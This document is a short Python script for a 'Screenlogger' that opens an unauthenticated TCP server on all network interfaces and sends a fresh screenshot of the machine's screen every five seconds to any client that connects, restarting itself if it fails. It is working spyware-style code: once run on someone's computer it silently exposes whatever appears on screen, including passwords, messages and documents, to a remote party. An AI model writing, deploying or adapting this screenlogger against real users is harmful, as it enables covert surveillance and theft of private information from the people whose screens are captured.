import pyautogui
import socket
import threading
import time
import io

# Server Configuration
HOST = '0.0.0.0'  # Listen on all available network interfaces
PORT = 12345  # Port number for communication

def capture_screenshot():
    """Captures a screenshot and returns it as bytes."""
    screenshot = pyautogui.screenshot()
    img_bytes = io.BytesIO()
    screenshot.save(img_bytes, format='PNG')
    return img_bytes.getvalue()

def handle_client(conn, addr):
    """Handles a connected client by continuously sending screenshots."""
    print(f"[+] Sreenlogger Connection from {addr}")
    
    while True:
        try:
            img_data = capture_screenshot()
            img_size = len(img_data)

            # Send image size and data
            conn.sendall(img_size.to_bytes(4, 'big'))
            conn.sendall(img_data)

            print(f"[*] Sent screenshot ({img_size} bytes) to {addr}")
            time.sleep(5)
        except (ConnectionResetError, BrokenPipeError):
            print(f"[-] Screenlogger client {addr} disconnected. [*] Waiting for a new connection...")
            break
        except Exception as e:
            print(f"[!] Sreenlogger Error: {e}")
            break

    conn.close()  # Close client connection

def start_server():
    """Starts the screenshot server and listens for client connections."""
    while True:
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)  # Fix for WinError 10048
        server.bind((HOST, PORT))
        server.listen(5)
        print(f"[*] Sreenlogger Listening on {HOST}:{PORT}")

        while True:
            try:
                conn, addr = server.accept()  # Accept new connection
                client_thread = threading.Thread(target=handle_client, args=(conn, addr))
                client_thread.start()
            except Exception as e:
                print(f"[!] Screenlogger Error accepting client: {e}")
                break  # Break out to restart the server

        server.close()  # Ensure the socket is closed before restarting
        print("[*] Screenlogger Server restarting...")
        time.sleep(2)  # Wait before restarting

if __name__ == "__main__":
    start_server()
